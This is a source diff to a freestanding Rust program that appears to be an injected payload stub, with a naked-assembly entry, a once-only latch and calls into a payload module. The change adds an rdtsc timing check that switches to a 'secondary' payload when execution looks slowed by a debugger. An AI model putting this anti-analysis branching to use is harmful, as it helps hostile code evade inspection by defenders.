@@ -1,7 +1,8 @@
 #![no_main]
 #![no_std]
+#![feature(abi_custom)]
 
-use core::{arch::naked_asm, panic::PanicInfo, sync::atomic::AtomicBool};
+use core::{arch::{naked_asm, x86_64::_rdtsc}, hint::black_box, panic::PanicInfo, sync::atomic::AtomicBool};
 
 use linux_syscall::{SYS_write, syscall};
 
@@ -15,7 +16,7 @@ unsafe extern "C" {
 
 #[unsafe(no_mangle)]
 #[unsafe(naked)]
-pub extern "C" fn _entry() {
+pub unsafe extern "custom" fn _entry() {
     naked_asm!(
         "lea r10, [rip]",
 
@@ -47,12 +48,18 @@ pub extern "C" fn _entry() {
 static LATCH: AtomicBool = AtomicBool::new(false);
 
 pub extern "C" fn _start(load_location: usize) {
+    let start = unsafe { _rdtsc() };
     if LATCH.compare_exchange(false, true, core::sync::atomic::Ordering::Relaxed, core::sync::atomic::Ordering::Relaxed).is_err() {
         return;
     }
-
-    garbage::_dummy();
-    self::payload::run();
+    black_box(garbage::_dummy());
+    let end = unsafe { _rdtsc() };
+    let diff = end - start;
+    if diff > 2000 {
+        self::payload::run_secondary();
+    } else {
+        self::payload::run();
+    }
 }
 
 #[panic_handler]
